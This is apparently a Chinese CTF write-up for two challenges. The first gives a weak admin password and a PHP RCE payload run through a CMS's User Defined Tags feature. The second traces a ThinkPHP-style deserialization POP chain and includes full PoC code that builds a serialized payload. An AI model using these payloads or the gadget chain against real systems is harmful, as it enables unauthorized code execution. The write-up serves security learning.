## my_first_cms
弱口令爆破
```
admin:Admin123
```

### RCE
```
1 ) log in as admin and go to Extensions > User Defined Tags > 
2 ) Write in Code place payload > <?php echo system('id'); ?
> 3 ) After click run you will be see result : uid=1000(admin) gid=1000(admin) groups=1000(admin) uid=1000(admin) gid=1000(admin) groups=1000(admin)
```

## 用过就是熟悉

明显的反序列化入口

![](attachments/Pasted%20image%2020240328194001.png)

`__wakeup` 没有进一步的反序列化

`__destruct` 
think/process/pipes/Windows.php
![](attachments/Pasted%20image%2020240328195056.png)

跟进`removeFiles()`

![](attachments/Pasted%20image%2020240328195136.png)

查找`__toString`

think/Collection.php

![](attachments/Pasted%20image%2020240328195711.png)

跟进toJson

![](attachments/Pasted%20image%2020240328195908.png)

跟进toArray

![](attachments/Pasted%20image%2020240328195941.png)

可触发`__get`

think/View.php
![](attachments/Pasted%20image%2020240328200346.png)

data可控可以触发 `__call`

think/Testone.php
![](attachments/Pasted%20image%2020240328200649.png)

文件名需要爆破，但是因为是使用时间函数进行MD5可以控制爆破范围

Testone 为抽象类寻找子类来实现

![](attachments/Pasted%20image%2020240328202301.png)

poc
```php
<?php  
namespace think\process\pipes {  
    class Windows  
    {  
        private $files = [];  
        public function __construct($a)  
        {  
            $this->files = [$a];  
        }  
    }  
}  
  
namespace think {  
    class Collection {  
        protected $items = [];  
        public function __construct($a) {  
            $this->items = $a;  
        }  
    }  
}  
namespace think {  
    class View  
    {  
        public $engine=array('time'=>'10086');  
        protected $data = [];  
        public function __construct($a)  
        {  
            $this->data = ['loginout'=>$a];  
        }  
    }  
}  
  
namespace think {  
    abstract class Testone {}  
}  
  
namespace think {  
    // Testone为抽象类需要找到子类才能生成  
    class Debug extends Testone {}  
}  
  
  
  
namespace think {  
    $Bug = new think\Debug();  
    $View = new think\View($Bug);  
    $Collection = new \think\Collection($View);  
    $Windows = new \think\process\pipes\Windows($Collection);  
    $poc = base64_encode(serialize($Windows));  
    echo($poc);  
}
```

后续得到文件包含的处理

![](attachments/Pasted%20image%2020240329080200.png)

